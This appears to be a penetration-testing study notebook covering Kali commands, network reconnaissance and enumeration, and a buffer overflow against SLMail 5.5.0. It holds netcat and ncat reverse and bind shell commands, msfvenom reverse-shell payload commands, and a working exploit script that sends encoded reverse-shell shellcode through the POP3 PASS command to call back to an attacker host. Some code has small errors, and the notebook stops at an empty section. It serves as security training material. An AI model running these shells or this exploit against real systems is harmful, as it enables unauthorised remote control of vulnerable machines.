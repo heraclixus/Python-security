{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__For education and self study purpose only. Technology is simply a tool, it is the user that defines its morality__ \n",
    "\n",
    "\n",
    "\n",
    "### Kali Quick Commands:\n",
    "1. best way to nagivate and find files in Kali: __updatedb__ then __locate(filename)__. \n",
    "2. __which__ searches through directories defined in PATH environment variable\n",
    "3. service start: __systemctl start (servicename)__. For example, __systemctl start ssh__. \n",
    "4. network service check: __netstat -antp__. For example, check SSH: __netstat -antp | grep sshd__. \n",
    "5. service auto start at booting: __systemctl enable (servicename)__.\n",
    "6. HTTP service: __systemctl start apache2__. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Bash Quick Reference: \n",
    "__wget (url)__ can be equally achieve in Python via the __httplib__ module. In bash, the chain of command can be pipelined to parse html page: __wget www.cisco.com__. The html page is by default in index.html, so the command is:<br>\n",
    "__cat index.html | grep \"href=\" | cut -d \"/\" -f 3 | grep \"\\.\" | cut -d '\"' -f 1 | sort -u__  <br>\n",
    "This means to get html page from cisco, find all patterns with string \"href\" and then use \"/\" as the delimiter, take the 3rd item in the pattern. This should give us\n",
    "The results are a list of domain names. the __host__ command can be used to discover IP address given domain name: <br> __for url in \\$(cat list.txt)\\$; do host \\$url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u__ "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Another usage for text processing bash could be to check access log:  <br>\n",
    "__cat access.log | grep \\<IP addr\\> | cut -d \"\\\"\" -f 2 | uniq -c__  <br>\n",
    "to find the most frequent IP address, or <br>\n",
    "__cat access.log | grep \\<IP addr\\> | grep '/admin' | sort -u __<br>\n",
    "to check the host that tried to access /admin directory. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "%%bash \n",
    "#!/bin/bash \n",
    "# ping sweep for IP range: 10.11.1.0/24\n",
    "for ip in $(seq 1 254); do \n",
    "    ping -c 1 10.11.1.$ip | grep \"byte from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 &\n",
    "done "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Python multiprocessing \n",
    "import multiprocessing \n",
    "import subprocess\n",
    "import os \n",
    "\n",
    "def pinger( job_q, results_q): \n",
    "    DEVNULL = open(os.devnull, 'w')\n",
    "    while True:\n",
    "        ip = job_q.get() \n",
    "        if ip is None: break \n",
    "        try:\n",
    "            subprocess.check_all(['ping', '-c1', ip], stdout=DEVNULL)\n",
    "            results_q.put(ip)\n",
    "        except:\n",
    "            pass \n",
    "\n",
    "if __name__ == '__main__':\n",
    "    pool_size = 255\n",
    "    jobs = multiprocessing.Queue() \n",
    "    results = multiprocessing.Queue()\n",
    "    pool = [ multiprocessing.Process(target=pinger, args=(jobs,results))\n",
    "             for i in range(pool_size) ]\n",
    "\n",
    "    for p in pool:\n",
    "        p.start()\n",
    "\n",
    "    for i in range(1,255):\n",
    "        jobs.put('192.168.1.{0}'.format(i))\n",
    "\n",
    "    for p in pool:\n",
    "        jobs.put(None)\n",
    "\n",
    "    for p in pool:\n",
    "        p.join()\n",
    "\n",
    "    while not results.empty():\n",
    "        ip = results.get()\n",
    "        print(ip)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Essential Command line tools \n",
    "#### Netcat:\n",
    "* check if the port is open on IP: __nc -nv (IP_addr) (portno)__\n",
    "The command will open a connection to the remote IP\n",
    "* listening on port: __nc -nlvp (portno)__ This will serve as a server. Usually used together with first command \n",
    "* Transfering files:  Receiver: __nc -nlvp 4444 > incoming.exe__ . Redirect all inputs to a file called _incoming.exe_. sender: __nc -nv (target_ip) 4444 < (path_to_file).__ The file transfer process is at background and blocking.\n",
    "* __Bindshell__: scenario: Bob requests Alice to use cmd.exe on his local machine. Bob: __nc -nlvp 4444 -e cmd.exe__. Alice: __nc -nv (Bob's IP) 4444__. This scenario is used because Alice is behind NAT and cannot receive connection from Bob.           \n",
    "* Get IP on a host: __ifconfig (network card) | grep inet__.\n",
    "* __Reverse Shell__: Bob requests Alice to send him a command shell. Bob: __nc -nlvp 4444__. Alice: __nc -nv (Bob's IP) 4444 -e /bin/bash__. This is used because Alice cannot forward traffic from the router to her internal machines, so Bob cannot directly get to her. Instead, she must send traffic to Bob. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Ncat \n",
    "* Whereas Netcat does not support encryption, Ncat does. Which could aid bypass firewall and intrusion detection.\n",
    "* __Bindshell__: Bob: __ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl__. This creates a more secure bind shell from Bob's machine that uses ssl. It would also only accept Alice's connection, given by IP 10.0.0.4. Alice would do: __ncat -v 10.0.0.22 4444 --ssl__ and directly connect to Bob, using also ssl.\n",
    "* __Reverse Shell__: Bob: __ncat --allow 10.0.0.4 -vnl 4444 --ssl__. Alice: __ncat --exec cmd.exe -v 10.0.0.22 4444 --ssl__. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tcpdump \n",
    "* Used to dump .pcap files captured, or conduct real time packet sniffing on network device. __tcpdump -r passwd.pcap__\n",
    "* Able to be used directly with shell script for document parsing and filtering. __tcpdump -n -r password_cracking_filtered.pcap | cut -d \" \" -f 3 | sort -u | head__\n",
    "* Flexible options for src, dst, port. __tcpdump -n src host (IP) -r (file)__. __tcpdump -n dst host (IP) -r (file)__ and __tcpdump -n port (portno) -r (file)__.\n",
    "* Dump packet in hex format: __tcpdump -nX -r (file.pcap)__ \n",
    "* __Advanced Header Filtering__: ![tcp](tcp-hdr.png)For example, to filter only packets that have PSH and ACK flas turned on, deal with the 14th byte of the TCP header. The flags are CEU__AP__RSF on the top, with AP for PSH and ACK, set to one, and all others zero. This gives 00011000, or 24 in decimal. This gives command: __tcpdump -A -n 'tcp[13] = 24' -r passwd.pcap__\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GUI tools "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Passive Information Gathering \n",
    "normally involves __Google Hacking__ and command line tools for Domain name discovery. \n",
    "* For example. __site:microsoft.com__ only gives sites with parent domain name microsoft\n",
    "* __filetype, inurl, intitle__ can also be used. For example, __intitle:\"netbotz appliance\" \"OK\" -filetype: pdf__ gives vulnerable netbotz camera sites. \n",
    "* More information about Google hacking can be found on __[exploit-db](https://www.exploit-db.com/google-hacking-database/)__\n",
    "* __Email Harvesting__: Kali specific tool: __theharvester -d cisco.com -b google > google.txt__  searches on Google for email address cisco.com.\n",
    "* __Whois__: __whois (domainname)__ can be used to do a basic reconnaisance of the target organization. It can also do a reverse lookup with __whois (IP)__.\n",
    "* __Recon-ng__ is a web reconnaissance framework written in Python. More detail can be found on __[Using Python to spy on your friends](https://www.youtube.com/watch?v=qkUIgl9ASGw)__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Active Information Gathering\n",
    "Active Info gathering normally includes __DNS Enumeration, Port Scanning, SMB Enumeration, SMTP, SNMP Enumeration__. \n",
    "DNS server interaction: \n",
    "* DNS Enumeration: \n",
    "    * host command: __host -t ns (domain)__ for ns record and __host -t mx (domain)__ for mail server. One can always use a Brute force guess on domain name and use host to get information. __for ip in \\$(seq\n",
    "155 190);do host 50.7.67.$ip;done |grep -v \"not found\"__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __DNS Zone Transfer__: similar to a database replication act between related DNS servers. zone file contains a list of all DNS names configured for that zone. Zone can only be copied from parent to child. DNS transfer are supposed to be limited to authorized child servers, but can be misconfigured. \n",
    "    * __host -l (domain name) (dns server address)__ performs a zone transfer. If a zone transfer is successful, a full list of zone files will be dumped. candidate name servers could be: __host -t ns (domain name) | cut -d \" \" f 4__."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "%%bash \n",
    "#!/bin/bash \n",
    "# automatic zone transfer \n",
    "if [ -z \"$1\" ]; then \n",
    "echo \"zone transfer usage: $0 <domain name>\"\n",
    "exit 0\n",
    "fi \n",
    "\n",
    "for server in $(host -t ns $1 | cut -d\" \" -f 4); do \n",
    "# for each name server, attempt a zone transfer \n",
    "host -l $1 $server | grep \"has address\" \n",
    "done "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Automatic tools on Kali to deal with DNS enumeartion includes: __[DNSRecon](https://pentestlab.blog/2012/11/13/dns-reconnaissance-dnsrecon/)__ and __[DNSenum](http://kalilinuxtutorials.com/dnsenum/)__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Port Scanning \n",
    "port scanning is the process of checking for open TCP and UDP ports on a remote machine. \n",
    "* TCP SYN scanning: use the threeway handshake to determine if port is open, using netcat __nc -nvv -w 1 -z (target ip) (target port range)__\n",
    "* Stealth scan: without completing a TCP handshake, with only SYN packet. if port is open, SYN-ACK should be received. This can deal firewall logging better, which normally deals with complete TCP sessions. But modern firewalls solved it.\n",
    "* UDP scanning: __nc -nv -u -z -w 1 10.0.0.19 160-162__. If UDP port is open, no reply is sent back; if UDP port is closed, ICMP port unreachable is replied.\n",
    "    * UDP port scanning is unreliable, since firewalls often drop ICMP, resulting to false positives. \n",
    "* Most port scanners scan only the popular ports \n",
    "* __Nmap Port scan__: default nmap TCP scan scans the 1000 most popular ports on a given machine, and it generates great amount of network traffic. __nmap -sT -p 1-65535 10.0.0.19__\n",
    "    * Network sweeping: __nmap -sn 10.11.1.1-254__ (ping sweep). \n",
    "    * __nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt__ records all online hosts \n",
    "    * __grep Up ping-sweep.txt | cut -d \" \" -f  2__\n",
    "    * Port sweeping: __nmap -p 80 10.11.1.1-254 -oG web-sweep.txt__\n",
    "    * __grep open web-sweep.txt | cut -d \" \" -f 2__ \n",
    "    * scan top 20 TCP ports: __nmap -sT -A --top-ports=20 10.11.1.1.-254 -oG top-port-sweep.txt__ \n",
    "    * OS Fingerprinting: __nmap -O 10.0.0.19__ grabs informatin about the OS for target \n",
    "    * Banner Grabbing: __nmap -sV -sT 10.0.0.19__ gives open port and their corresponding services \n",
    "    * Nmap Scripting Engine: __NSE__ gives automatic scanning script generation options. __nmap 10.0.0.19 --script smb-os-discovery.nse__ attemps to connect to the SMB service on target and determines its OS version. \n",
    "    * DNS zone transfer: __nmap --script=dns-zone-transfer -p 53 (nameserver)__ "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __SMB Enumeration__: Server Message Block protocol is often vulnerable due to its complexity and open nature. SMB version and Windows: \n",
    "    * SMB1: Windows 2000, XP, and Windows 2003 \n",
    "    * SMB2: Windows Visa and Windows 2008\n",
    "    * SMB2.1: Windows 7 and Windows 2008 R2\n",
    "    * SMB3: Windows 8 and Windows 2012 \n",
    "    * NetBIOS scanning: __nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254__ since SMB NetBIOS listens on TCP port 139, 445 and several UDP port. Or more complecated tool: __nbtscan -r 10.11.1.0/24__ for the whole subnet. \n",
    "    * Null Session Enumeration: this refers to unauthenticated NetBIOS session between two computers. tools for use are __[enum4linux](https://tools.kali.org/information-gathering/enum4linux)__, __smbclient, rpcclient, net, nmblookup__. \n",
    "    * Nmap SMB NSE scripts: simply use __ls -l /usr/share/nmap/scripts/smb\\*__ for all scripts. One example is __nmap -v -p 139, 445, --script=smb-os-discovery 10.11.1.227__. Another __nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=110.11.1.201__ to check vulnerabilities \n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __SMTP Enumeration__: VERY commands asks the server to verify an email address, EXPN asks server for membership of a mailing list. \n",
    "    * __nc -nv 10.11.1.215 25__ connects to the smtp port of the target. After successful connection, one can use commands such as \"VERY root\" or \"EXPN (email)\" "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# equivalent python script \n",
    "import socket \n",
    "import sys\n",
    "if len(sys.argv) != 2:\n",
    "    print \"usage: verfy.py <username>\"\n",
    "    sys.exit(0)\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "connect = s.connect(('10.11.1.215'. 25))\n",
    "banner = s.recv(1024)\n",
    "print(\"banner is\" + banner)\n",
    "s.send('VRFY' + sys.argv[1] + '\\r\\n')\n",
    "result = s.recv(1024)\n",
    "print result \n",
    "s.close() "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* __SNMP Enumeration__: based on UDP, susceptible to IP spoofing and relay attacks. no encryption on version 1,2,and 2c. Weak authentication schemes. \n",
    "    * [MIB tree](http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm ) is a database containing information usually related to network management\n",
    "    * __nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt__ scans for open SNMP ports \n",
    "    * Another way is to use the communicty string: \n",
    "        * __echo public > community__ \n",
    "        * __echo private >> community__\n",
    "        * __echo manager >> community __\n",
    "        * __for ip in \\$(seq 1 254); do echo 10.11.1.$ip; done > ips \n",
    "        * __onesixtyone -c community -i ips__ \n",
    "    * __Windows SNMP Enumeration: __snmpwalk__ assumes we know the community string, most likely \"public\". \n",
    "        * __snmpwalk -c public -v1 10.11.1.219__ Enumerates the entire MIB tree \n",
    "        * __snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25__ Enumerates Windows user. the string in the end is the community string for windows user \n",
    "        * __snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3__ Enumerates open TCP ports \n",
    "        * __snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2__ Enumerates installed softwares "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Vulnerability Scanning: \n",
    "The process of using automated tools to discover and identify vulnerabilities in network. \n",
    "* Nmap NSE scan for vulnerability: \n",
    "    * __ls -l /usr/share/nmap/scripts/\\*vul\\*__ to find all vulnerability scanning scripts \n",
    "    * an example is __nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210__. If the server is vulnerable, Nmap can even finish the exploit. \n",
    "    * __nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254__ scans for FTP servers that allow anonymous access.\n",
    "    * __nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236__ scans for smb security level \n",
    "    * __nmap -v -p 80 --script=http-vuln-cve2011-3192 10.11.1.205-210__ checks if software has been patched against certain exploit, here is Apache DoS attack. \n",
    "    \n",
    "* OpenVAS Vulnerability Scanner: \n",
    "    * In Kali, first setup using __openvas-setup__ \n",
    "    * then __firefox https://127.0.0.1:9392__ as it uses port 9392\n",
    "    * the GUI page will show up, user can log in with the credential created in first step. It is a GUI, so rather easy to use"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Buffer Overflow\n",
    "#### Fuzzing \n",
    "fuzzing involves sending malformed data into application input and watching for unexpected crashes. This is an exploit on sofware that lacks input validations.<br>\n",
    "The example uses the _SLMail 5.5.0 Mail Service_ software as the target, which has buffer overflow vulnerability affecting the POP3 __PASS__ command, provided during user login. The software was also not compiled using Data Execution Prevention and Address Space Layout Randomization support, making exploitation simpler.\n",
    "* __DEP__ is is a set of hardware, and software, technologies that perform additional checks on memory, to help prevent malicious code from running on a system.The primary benefit of DEP is to help prevent code execution from data pages, by raising an exception, when execution occurs.\n",
    "* __ASLR__ randomizes the base address of loaded applications and DLLs everytime the OS is booted. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# talk to POP3 server using python\n",
    "import socket \n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "try:\n",
    "    print \"\\nSending evil buffer...\"     # connect to IP, POP3 port\n",
    "    s.connect(('10.0.0.22',110))\n",
    "    data = s.recv(1024)   # receive banner\n",
    "    print data # print banner\n",
    "    \n",
    "    s.send('USER test' + '\\r\\n')  \n",
    "    data = s.recv(1024)\n",
    "    print data\n",
    "    \n",
    "    s.send('PASS test\\r\\n')\n",
    "    data = s.recv(1024)\n",
    "    print data\n",
    "    \n",
    "    s.close()\n",
    "    print \"\\nDone\"\n",
    "except:\n",
    "    print \"Could not connect to POP3\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# fuzzing \n",
    "\n",
    "import socket\n",
    "# Create an array of buffers, from 1 to 5900, with increments of 200.\n",
    "buffer=[\"A\"]\n",
    "counter=100\n",
    "while len(buffer) <= 30:\n",
    "    buffer.append(\"A\"*counter)\n",
    "    counter=counter+200\n",
    "for string in buffer:\n",
    "    print \"Fuzzing PASS with %s bytes\" % len(string)\n",
    "    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    connect=s.connect(('10.0.0.22',110))\n",
    "    s.recv(1024)\n",
    "    s.send('USER test\\r\\n')\n",
    "    s.recv(1024)\n",
    "    s.send('PASS ' + string + '\\r\\n')\n",
    "    s.send('QUIT\\r\\n')\n",
    "    s.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The idea of fuzzing is to try to send arbitrary length (usually incremental) of string to test if a program that accepts input would crash. With the understanding of function call execution, one can control the ESP/RSP register and execute arbitrary codes. <br>\n",
    "\n",
    "Sending buffer can be with __Binary Tree Analysis__: instead of sending 2700 As, send 1350 As and 1350 Bs. and check the value of EIP register (whether A or B), continue to do this until EIP is found. This is indeed a binary search on EIP register.  <br>\n",
    "\n",
    "Another method is to use Unique strings: \n",
    "* In Kali, do __locate pattern_create__ \n",
    "* Then, __(path to pattern_create) -l 2700__ creates 2700 byte unique string\n",
    "* An example is __/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700__\n",
    "* After finding the value of EIP in debugger, use __pattern_offset__ to find the offset of the hex string \n",
    "* An example is __ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438__ assuming 39694478 is the value of EIP. \n",
    "* Suppose that the result of the previous step gives 2606. This means that beginning from the 2606th byte, we have EIP register. So sending a buffer of __\"A\" * 2606 + \"B\" * 4 + \"C\" * 90__ will store \\x42\\x42\\x42\\x42 in EIP register. \n",
    "* Shell code coule be included in the buffer, and one can simply change the ESP register to point to the beginning of the shell code.\n",
    "* Bad character avoidance: One way is to send all possible chars and see which ones are omitted by the program. Usually we have __0x00, 0x0A, 0x0D__. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import socket\n",
    "# testing bad characters for program \n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "badchars = (\n",
    "\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n",
    "\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n",
    "\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n",
    "\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n",
    "\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n",
    "\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n",
    "\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n",
    "\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n",
    "\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n",
    "\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n",
    "\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n",
    "\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n",
    "\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n",
    "\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n",
    "\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n",
    "\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )\n",
    "\n",
    "buffer=\"A\"*2606 + \"B\"*4 + badchars\n",
    "try:\n",
    "    print \"\\nSending evil buffer...\"\n",
    "    s.connect(('10.0.0.22',110))\n",
    "    data = s.recv(1024)\n",
    "    s.send('USER username' +'\\r\\n')\n",
    "    data = s.recv(1024)\n",
    "    s.send('PASS ' + buffer + '\\r\\n')\n",
    "    s.close()\n",
    "    print \"\\nDone!\"\n",
    "except:\n",
    "    print \"Cannot connect to POP3\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Execution Flow Control for Buffer Overflow \n",
    "the task for a buffer overflow attack is to redirect the execution flow to the shellcode located at the memory address that ESP register points to at crash time. Since the address of ESP register changes often at crash time, we need to make use of __JMP ESP__ instruction in the code (we jump to the code and the code jump to ESP).  <br>\n",
    "Immunity Debugger's __mona.py__ can be used to the find the memory address of the instruction. Here we still have the resitrction of \"no memory protection such as DEP and ASLR\" and \"memory range has no bad characters\". The mona scripts will display all possible modules to use, and we need to choose the ones with all criterions as \"FALSE\" \n",
    "* Find the module (i.e dll file) that satisfies the criterion of non-memory protected and not located at address with bad character.\n",
    "* From within the module, find the __JMP ESP__ instruction's address. \n",
    "* If the program is compiled with DEP, only instruction ins .text should be used. Otherwise we can use any address. \n",
    "* use metasploit to find the instruction opcode: __/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb __\n",
    "* suppose nasm gives the address for jmp esp as: FFE4 \n",
    "* in Immunity, type: __!mona find -s \"\\xff\\xe4\" -m abc.dll__ assuming the module found is abc.dll\n",
    "* This will give several candidates. Choose the one without bad characters. Suppose the result is __0x5f4a358f__. \n",
    "* Therefore the buffer should be: __ \"A\" * 2606 + \"\\x8f\\x35\\x4a\\x5f\" + Shell_code __, with address in __little endian__. \n",
    "* __shellcode generaiton__: __msfvenom -l payloads__ is the general syntax for generating payload with metasploit.\n",
    "    * __msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c__ is a reverse shell payload. Once executed the command in Kali, the shellcode will appear in the command line.  However, this could generate bad characters.\n",
    "    * __msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\"__ encodes the shell code, as well as get rid of bad characters 0x00, 0x0a, and 0x0d. \n",
    "    * Note that host IP and port number are all specified. Different payload has different parameters to specify. \n",
    "    * To offset the decoder's behavior at the start of ESP register, we need to add __NOP__, or 0x90 , at the start of the shell code. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "shellcode = (\"\\xba\\xde\\xea\\x23\\x34\\xda\\xce\\xd9\\x74\\x24\\xf4\\x5f\\x33\\xc9\\xb1\"\n",
    "\"\\x52\\x31\\x57\\x12\\x03\\x57\\x12\\x83\\x31\\x16\\xc1\\xc1\\x31\\x0f\\x84\"\n",
    "\"\\x2a\\xc9\\xd0\\xe9\\xa3\\x2c\\xe1\\x29\\xd7\\x25\\x52\\x9a\\x93\\x6b\\x5f\"\n",
    "\"\\x51\\xf1\\x9f\\xd4\\x17\\xde\\x90\\x5d\\x9d\\x38\\x9f\\x5e\\x8e\\x79\\xbe\"\n",
    "\"\\xdc\\xcd\\xad\\x60\\xdc\\x1d\\xa0\\x61\\x19\\x43\\x49\\x33\\xf2\\x0f\\xfc\"\n",
    "\"\\xa3\\x77\\x45\\x3d\\x48\\xcb\\x4b\\x45\\xad\\x9c\\x6a\\x64\\x60\\x96\\x34\"\n",
    "\"\\xa6\\x83\\x7b\\x4d\\xef\\x9b\\x98\\x68\\xb9\\x10\\x6a\\x06\\x38\\xf0\\xa2\"\n",
    "\"\\xe7\\x97\\x3d\\x0b\\x1a\\xe9\\x7a\\xac\\xc5\\x9c\\x72\\xce\\x78\\xa7\\x41\"\n",
    "\"\\xac\\xa6\\x22\\x51\\x16\\x2c\\x94\\xbd\\xa6\\xe1\\x43\\x36\\xa4\\x4e\\x07\"\n",
    "\"\\x10\\xa9\\x51\\xc4\\x2b\\xd5\\xda\\xeb\\xfb\\x5f\\x98\\xcf\\xdf\\x04\\x7a\"\n",
    "\"\\x71\\x46\\xe1\\x2d\\x8e\\x98\\x4a\\x91\\x2a\\xd3\\x67\\xc6\\x46\\xbe\\xef\"\n",
    "\"\\x2b\\x6b\\x40\\xf0\\x23\\xfc\\x33\\xc2\\xec\\x56\\xdb\\x6e\\x64\\x71\\x1c\"\n",
    "\"\\x90\\x5f\\xc5\\xb2\\x6f\\x60\\x36\\x9b\\xab\\x34\\x66\\xb3\\x1a\\x35\\xed\"\n",
    "\"\\x43\\xa2\\xe0\\xa2\\x13\\x0c\\x5b\\x03\\xc3\\xec\\x0b\\xeb\\x09\\xe3\\x74\"\n",
    "\"\\x0b\\x32\\x29\\x1d\\xa6\\xc9\\xba\\x28\\x37\\xd1\\x3e\\x45\\x35\\xd1\\x3f\"\n",
    "\"\\x2e\\xb0\\x37\\x55\\x40\\x95\\xe0\\xc2\\xf9\\xbc\\x7a\\x72\\x05\\x6b\\x07\"\n",
    "\"\\xb4\\x8d\\x98\\xf8\\x7b\\x66\\xd4\\xea\\xec\\x86\\xa3\\x50\\xba\\x99\\x19\"\n",
    "\"\\xfc\\x20\\x0b\\xc6\\xfc\\x2f\\x30\\x51\\xab\\x78\\x86\\xa8\\x39\\x95\\xb1\"\n",
    "\"\\x02\\x5f\\x64\\x27\\x6c\\xdb\\xb3\\x94\\x73\\xe2\\x36\\xa0\\x57\\xf4\\x8e\"\n",
    "\"\\x29\\xdc\\xa0\\x5e\\x7c\\x8a\\x1e\\x19\\xd6\\x7c\\xc8\\xf3\\x85\\xd6\\x9c\"\n",
    "\"\\x82\\xe5\\xe8\\xda\\x8a\\x23\\x9f\\x02\\x3a\\x9a\\xe6\\x3d\\xf3\\x4a\\xef\"\n",
    "\"\\x46\\xe9\\xea\\x10\\x9d\\xa9\\x1b\\x5b\\xbf\\x98\\xb3\\x02\\x2a\\x99\\xd9\"\n",
    "\"\\xb4\\x81\\xde\\xe7\\x36\\x23\\x9f\\x13\\x26\\x46\\x9a\\x58\\xe0\\xbb\\xd6\"\n",
    "\"\\xf1\\x85\\xbb\\x45\\xf1\\x8f\")\n",
    "\n",
    "buffer=\"A\"*2606 + \"\\x8f\\x35\\x4a\\x5f\" + \"\\x90\" * 8 + shellcode\n",
    "try:\n",
    "    print \"\\nSending evil buffer...\"\n",
    "    s.connect(('10.0.0.22',110))\n",
    "    data = s.recv(1024)\n",
    "    s.send('USER username' +'\\r\\n')\n",
    "    data = s.recv(1024)\n",
    "    s.send('PASS ' + buffer + '\\r\\n')\n",
    "    s.close()\n",
    "    print \"\\ Done. Did you get a reverse shell?\"\n",
    "    \n",
    "except:\n",
    "    print \"Could not connect to POP3!\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, the attacker can set __nc -nlvp 443__ on local machine and listen after sending the buffer. If successful, a reverse shell should spawn on attacker's machine. <br>\n",
    "\n",
    "The above execution will crash the program. However, if the program is multithreaded, we can just terminate the thread without crashing the whole program. The service could still continue in this case. This is simply achieved via msfvenom's ExitThread method: __msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\" __ to generate the shell code. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Linux Based Buffer Overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Working with Exploits \n",
